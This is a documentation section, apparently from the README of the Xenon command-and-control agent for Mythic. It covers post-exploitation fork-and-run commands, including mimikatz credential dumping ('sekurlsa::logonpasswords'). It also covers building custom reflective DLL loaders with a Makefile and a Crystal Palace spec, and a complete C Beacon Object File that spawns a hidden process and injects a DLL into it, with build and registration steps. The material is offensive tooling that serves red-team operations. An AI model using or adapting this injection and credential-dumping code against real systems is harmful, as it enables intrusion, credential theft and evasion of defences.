## Fork & Run Commands
These commands spawn a sacrificial process to perform their actions and call `inject_shellcode` under the hood using donut-shellcode. 
They are compatible with Cobalt Strike's Process Injection Kits.

| Command                  | Usage                                                         | Description |
|--------------------------|---------------------------------------------------------------|-------------|
| `mimikatz`          | `mimikatz [args]`                                               | Execute mimikatz on the host. (e.g., mimikatz sekurlsa::logonpasswords) OPSEC Warning: Uses donut shellcode. |
| `execute_assembly` | `execute_assembly -Assembly [SharpUp.exe] [-Arguments [assembly arguments]]` | Execute a .NET Assembly in a remote processes and retrieve the output. OPSEC Warning: Uses donut shellcode. |

## User-Defined Reflective Loader (UDRL)
In previous versions, Xenon used donut-shellcode to generate shellcode from its DLL output type. That has changed.
Now by default, Xenon uses a simple reflective DLL loader based on the [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) linker created by Raphael Mudge.

Additionally, operators can now define their own reflective DLL loader during the build process for the `shellcode` output type. The loader must be based on the Crystal Palace linker.

Once enabled and uploaded, Mythic will:
1. Compile the Xenon agent DLL
2. Unzip the UDRL
3. Compile the UDRL with `make`
4. Use the Crystal Palace linker to create a PIC blob (UDRL + DLL)

### How to use

Find the default Crystal Palace RDL that comes with Xenon [here](https://github.com/nickswink/crystal-simple-loader).

> [!IMPORTANT]
> To use your own crystal palace RDL you must zip the source and upload.

```bash
# Clone basic loader
git clone https://github.com/nickswink/crystal-simple-loader.git

cd crystal-simple-loader

# << Make your changes >>

# Zip directory
zip -r loader.zip .

# Upload loader.zip during Xenon build process
```

As stated before, the loader must be uploaded as a ZIP file. Your loader must follow a basic format with at least the following:
- `Makefile` - default build command as `make`
- `loader.spec`
- Any source files needed to build the loader

An example of a directory tree for the simple loader that comes with Xenon looks like this:
```
.
├── Makefile
├── libtcg.x64.zip
├── loader.spec
└── src
    ├── loaddll.c
    ├── loader.c
    ├── loaderdefs.h
    └── tcg.h
```

#### Makefile
This is an example makefile from the Crystal Palace RDL examples. 
```makefile
CC_64=x86_64-w64-mingw32-gcc

all: bin/loader.x64.o

bin:
	mkdir bin

bin/loader.x64.o: bin
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/loader.c -o bin/loader.x64.o

clean:
	rm -f bin/*
```

#### Spec File
The `loader.spec` file is a key linker file specific to Crystal Palace. It tells the Crystal Palace linker details about how to create our PIC.
```yaml
x64:
	load "bin/loader.x64.o"       # read the loader COFF
		make pic +gofirst          # turn it into PIC and ensure the go function is at the start
		dfr "resolve" "ror13"      # use ror13 with the resolve method for resolving dfr functions
		mergelib "libtcg.x64.zip"  # merge the shared library

		# read the dll being provided
		push $DLL
		# link it to the "dll" section in the loader
		link "dll"

		# export the final pic
		export
```


### Development
If you want to modify/create your own reflective loader I highly recommend watching the overview videos from Raphael [here](https://tradecraftgarden.org/videos.html).

[Rasta Mouse](https://github.com/rasta-mouse) also has some great resources more specifically for Cobalt Strike in [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit).


## Process Injection Kit
You can read about Cobalt Strike's Process Injection Kit [here](https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5).
It allows the operator to modify the default behavior for Fork & Run post-ex commands. This provided the flexibility needed and allowed operators to Bring Your Own Process Injection.
Xenon's default process injection technique is the classic APC injection.
It follows a well signatured process of: `CreateProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `QueueUserAPC`, and finally `ResumeThread`.

### Bring Your Own Process Injection
The command `register_process_inject_kit` allows you to enable a custom process injection technique in the running payload. Process Injection Kit's are implemented as Beacon Object Files (BOFs) and applied through the modal.

Currently only **PROCESS_INJECT_SPAWN** is implemented which spawns a sacrificial process to perform process injection.

Here is a basic example from [Cobalt Strike](https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5):
```C
#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;

   /* Warn about crossing to another architecture. */
   if (!is_x64() && x86 == FALSE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
   }
   if (is_x64() && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* zero out these data structures */
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   /* setup the other values in our startup info structure */
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   /* Ready to go: spawn, inject and cleanup */
   if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
      return;
   }
   BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);
   BeaconCleanupProcess(&pi);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}
```
This example is represents Xenon's default process injection technique implemented as a BOF under `xenon/agent_code/Loader/inject-kits`. It can be easily modified to change the injection behavior to something custom, and that's where the advantage is. Additionally, with `register_process_inject_kit` the injection behavior can be changed an infinite amount in the running payload without compiling a new payload.

**NOTE** - The registered process injection kit will apply globally to **ALL** instances of Xenon, not just the callback you submitted the register command in.

You can compile this as a BOF with the following:
```
x86_64-w64-mingw32-gcc -o inject_spawn.x64.o -c inject_spawn.c 
```
Then register the new kit with the `register_process_inject_kit` command to the Mythic server. Now commands that call `inject_shellcode` will use your new process injection behavior!

### Examples
Here are some real-world examples of modified injection kits:
